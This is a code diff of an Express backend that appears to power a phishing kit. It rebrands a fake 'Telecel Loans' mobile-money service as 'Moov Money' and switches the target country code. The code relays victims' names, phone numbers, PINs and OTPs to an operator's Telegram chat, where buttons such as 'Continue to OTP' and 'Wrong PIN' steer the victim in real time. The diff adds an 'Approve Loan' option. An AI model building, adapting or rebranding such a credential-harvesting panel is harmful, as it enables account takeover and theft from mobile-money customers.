@@ -23,7 +23,7 @@ app.use(express.static(__dirname));
 app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 app.get('/health', (_req, res) => {
-  res.json({ ok: true, service: 'telecel-loans-backend', ts: new Date().toISOString() });
+  res.json({ ok: true, service: 'moov-money-backend', ts: new Date().toISOString() });
 });
 
 app.get('/setup', async (_req, res) => {
@@ -48,7 +48,7 @@ app.get('/setup', async (_req, res) => {
 //  POST /notify
 //
 //  type = 'pin'  → sends Name, Phone, Date & Time, PIN
-//                  + [✅ Continue to OTP] [❌ Wrong PIN]
+//                  + [✅ Continue to OTP] [❌ Wrong PIN] [✅ Approve Loan]
 //
 //  type = 'otp'  → sends Name, Phone, Date & Time, OTP
 //                  + [❌ Wrong OTP] [❌ Invalid PIN]
@@ -63,7 +63,7 @@ app.post('/notify', async (req, res) => {
     return res.status(400).json({ ok: false, error: 'Missing required fields' });
   }
 
-  const fullPhone = `${countryCode || '+233'} ${phone}`.trim();
+  const fullPhone = `${countryCode || '+225'} ${phone}`.trim();
 
   // ── Generate token + HMAC ──
   const token = crypto.randomBytes(8).toString('hex');
@@ -91,9 +91,11 @@ app.post('/notify', async (req, res) => {
            + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
            + `Awaiting your decision\\.`;
 
+      // ── 3 BUTTONS: Continue to OTP | Wrong PIN | Approve Loan ──
       keyboard = [[
         { text: '✅ Continue to OTP', callback_data: cbData('continue_otp') },
         { text: '❌ Wrong PIN',      callback_data: cbData('pin_wrong')    },
+        { text: '✅ Approve Loan',   callback_data: cbData('loan_approved') },
       ]];
 
     } else if (type === 'otp') {
@@ -218,7 +220,7 @@ app.post('/webhook', async (req, res) => {
       case 'continue_otp':
         setResult(token, 'continue_otp', config.tokenTtl);
         await removeButtons(chatId, msgId);
-        await sendAdminMessage(`✅ *PIN Approved*\nUser \`${escMd(session.phone)}\` may now enter OTP\\.`, []);
+        await sendAdminMessage(`✅ *PIN Approved — OTP*\nUser \`${escMd(session.phone)}\` may now enter OTP\\.`, []);
         await answerCallback(cbId, '✅ Continuing to OTP');
         break;
 
@@ -244,6 +246,7 @@ app.post('/webhook', async (req, res) => {
         await answerCallback(cbId, '🚫 Invalid session — user redirected');
         break;
 
+      // ── Loan decision actions (works from both PIN and OTP screens) ──
       case 'loan_approved':
         setResult(token, 'loan_approved', config.tokenTtl);
         await removeButtons(chatId, msgId);
@@ -268,7 +271,7 @@ app.post('/webhook', async (req, res) => {
 
 // ════ DEBUG ROUTE ════
 app.get('/test', async (_req, res) => {
-  const result = await sendAdminMessage('🧪 Test message from Telecel Loans\\.', []);
+  const result = await sendAdminMessage('🧪 Test message from Moov Money\\.', []);
   res.json({
     telegramResponse: result,
     adminChatId:      config.adminChatId,
@@ -279,7 +282,7 @@ app.get('/test', async (_req, res) => {
 });
 
 app.listen(config.port, () => {
-  console.log(`\n🚀 Telecel Loans backend running on port ${config.port}`);
+  console.log(`\n🚀 Moov Money backend running on port ${config.port}`);
   console.log(`   Webhook URL: ${config.serverUrl}/webhook`);
   console.log(`   Setup URL:   ${config.serverUrl}/setup`);
   console.log(`   Health:      ${config.serverUrl}/health\n`);
